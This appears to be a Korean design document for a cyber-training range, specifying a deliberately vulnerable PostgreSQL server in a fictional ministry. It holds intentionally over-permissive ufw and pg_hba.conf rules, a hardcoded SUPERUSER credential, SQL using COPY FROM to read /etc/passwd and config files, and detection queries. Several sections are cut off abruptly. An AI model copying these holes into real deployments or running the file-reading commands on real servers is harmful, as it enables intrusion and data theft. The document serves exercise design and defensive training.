## 1. 개요

### 1.1 자산 목적

DB 서버는 가상국가 발도리아(Valdoria) 행정안전부(MOIS)의 내부망에 위치한 중앙 데이터베이스 서버이다. PostgreSQL 15를 기반으로 다음 서비스들의 핵심 데이터를 저장 및 관리한다:

- **외부 포털 (mois_portal)**: 시민 대상 공지사항, 문의 접수, 사용자 계정 데이터
- **내부 업무 포털 (agency_db)**: 직원 정보, 부서 구조, 전자 결재, 업무 요청 데이터
- **민원 처리 (complaint_db)**: 민원 접수 이력, 처리 상태, 첨부파일 메타데이터

모든 INT 구간 서비스의 데이터가 이 단일 서버에 집중되어 있어, 침해 시 전체 기관의 업무 데이터가 노출된다.

### 1.2 훈련에서의 역할

> **이 자산은 전체 사이버 훈련의 최종 데이터 유출 목표(DATA EXFILTRATION TARGET)이다.**

공격자가 민원 처리 서버(192.168.92.206)에서 RCE를 획득한 후, `.env` 파일에서 탈취한 하드코딩 자격증명(`app_service` / `Sup3rS3cr3t!`)으로 이 DB 서버에 직접 접근한다. 서비스 계정이 SUPERUSER 권한을 보유하고 있어, 공격자는 다음을 수행할 수 있다:

- 전체 3개 데이터베이스의 모든 테이블 덤프
- `COPY TO` 명령으로 서버 로컬 파일 읽기 (`/etc/passwd`, `/etc/shadow` 등)
- 새 계정 생성, 권한 변경 등 DB 레벨 백도어 설치
- `pg_read_server_files` 역할을 통한 PostgreSQL 설정 파일 열람

| 포트 | 프로토콜 | 서비스 | 바인드 | 비고 |
|------|---------|--------|-------|------|
| 5432 | TCP | PostgreSQL | 0.0.0.0 | **의도적 취약점: 전체 서브넷 접근 가능** |

### 4.3 방화벽 규칙 (ufw)

```bash
# 인바운드 — 의도적으로 과도하게 허용
ufw allow from 192.168.92.0/24 to any port 5432 proto tcp    # PostgreSQL (INT 전체 서브넷)
# ★ 취약점: 특정 호스트가 아닌 서브넷 전체에 대해 허용 → 횡이동 시 악용 가능 ★

# 아웃바운드 — 기본 허용 (DB 서버는 외부 연결 최소화)
ufw default allow outgoing
```

> **보안 문제:** 정상적인 환경이라면 `192.168.92.204` (내부 포털), `192.168.92.206` (민원 처리), `192.168.92.201` (외부 포털)만 허용해야 하지만, 의도적으로 INT 전체 서브넷(`192.168.92.0/24`)을 허용하여 횡이동한 공격자가 접근할 수 있도록 설계했다.

### 4.4 pg_hba.conf (PostgreSQL 클라이언트 인증)

```ini
# TYPE  DATABASE        USER            ADDRESS                 METHOD

# 로컬 접속 (소켓)
local   all             postgres                                peer
local   all             all                                     peer

# IPv4 로컬
host    all             all             127.0.0.1/32            scram-sha-256

# ★ 의도적 취약점: INT 전체 서브넷에서 모든 DB, 모든 사용자 접근 허용 ★
host    all             all             192.168.92.0/24        md5

# DMZ 외부 포털 서버 (OPNSense-2 경유)
host    mois_portal     portal_app      192.168.92.201/32       md5

# IPv6 로컬
host    all             all             ::1/128                 scram-sha-256
```

> **취약점 설명:** `host all all 192.168.92.0/24 md5` 규칙은 INT 서브넷의 모든 호스트에서 모든 데이터베이스에 모든 사용자로 접속을 시도할 수 있게 한다. 정상적이라면 아래와 같이 설정해야 한다:
> ```ini
> # 올바른 설정 (참고용)
> host    agency_db       app_service     192.168.92.204/32       scram-sha-256
> host    complaint_db    app_service     192.168.92.206/32       scram-sha-256
> ```

## 6. 데이터베이스 스키마 명세

### 6.1 mois_portal 데이터베이스

외부 포털에서 사용하는 공지사항, 사용자, 문의 데이터를 저장한다.

#### 6.1.1 DDL

```sql
-- =============================================================
-- 데이터베이스: mois_portal
-- 용도: 외부 포털 (시민 대상 공지, 문의, 사용자 관리)
-- =============================================================

CREATE DATABASE mois_portal
    WITH OWNER = postgres
    ENCODING = 'UTF8'
    LC_COLLATE = 'ko_KR.UTF-8'
    LC_CTYPE = 'ko_KR.UTF-8'
    TEMPLATE = template0;

\c mois_portal;

-- -----------------------------------------------------------
-- 테이블: users (포털 회원)
-- -----------------------------------------------------------
CREATE TABLE users (
    id              SERIAL PRIMARY KEY,
    username        VARCHAR(100) UNIQUE NOT NULL,
    email           VARCHAR(200),
    password        VARCHAR(200) NOT NULL,
    role            VARCHAR(50) DEFAULT 'viewer',
    last_login      TIMESTAMP,
    created_at      TIMESTAMP DEFAULT NOW()
);

CREATE INDEX idx_users_email ON users(email);
CREATE INDEX idx_users_username ON users(username);

-- -----------------------------------------------------------
-- 테이블: notices (공지사항)
-- -----------------------------------------------------------
CREATE TABLE notices (
    id              SERIAL PRIMARY KEY,
    title           VARCHAR(500) NOT NULL,
    content         TEXT,
    category        VARCHAR(100) DEFAULT 'General',
    author          VARCHAR(100) DEFAULT 'Admin',
    is_public       BOOLEAN DEFAULT TRUE,
    view_count      INTEGER DEFAULT 0,
    created_at      TIMESTAMP DEFAULT NOW(),
    updated_at      TIMESTAMP DEFAULT NOW()
);

CREATE INDEX idx_notices_category ON notices(category);
CREATE INDEX idx_notices_created ON notices(created_at DESC);
CREATE INDEX idx_notices_is_public ON notices(is_public);

-- -----------------------------------------------------------

### 8.5 VULN-DB-04: COPY TO/FROM 파일 접근

#### 8.5.1 취약 메커니즘

PostgreSQL의 `COPY TO/FROM` 명령은 SUPERUSER가 서버의 로컬 파일 시스템에 직접 접근할 수 있게 한다. `app_service` 계정이 SUPERUSER이므로, 공격자가 이 기능을 악용할 수 있다.

#### 8.5.2 공격 명령

```sql
-- 서버의 /etc/passwd 읽기
CREATE TEMP TABLE etc_passwd (line TEXT);
COPY etc_passwd FROM '/etc/passwd';
SELECT * FROM etc_passwd;

-- 결과 예시:
--  root:x:0:0:root:/root:/bin/bash
--  postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
--  ...

-- PostgreSQL 설정 파일 읽기
CREATE TEMP TABLE pg_conf (line TEXT);
COPY pg_conf FROM '/etc/postgresql/15/main/postgresql.conf';

#### 9.2.4 대량 데이터 조회 탐지

```sql
-- pg_stat_statements에서 대량 조회 감지
SELECT
    userid::regrole,
    dbid::regdatabase AS database,
    calls,
    total_exec_time::numeric(10,2) AS total_ms,
    rows,
    query
FROM pg_stat_statements
WHERE rows > 100
ORDER BY rows DESC
LIMIT 20;

-- 비정상적으로 큰 결과를 반환한 쿼리 (SELECT * FROM ... 패턴)
SELECT
    userid::regrole,
    dbid,
    calls,
    rows,
    left(query, 200) AS query_preview
FROM pg_stat_statements
WHERE query ILIKE '%SELECT%*%FROM%'
  AND rows > 50
ORDER BY rows DESC;
```
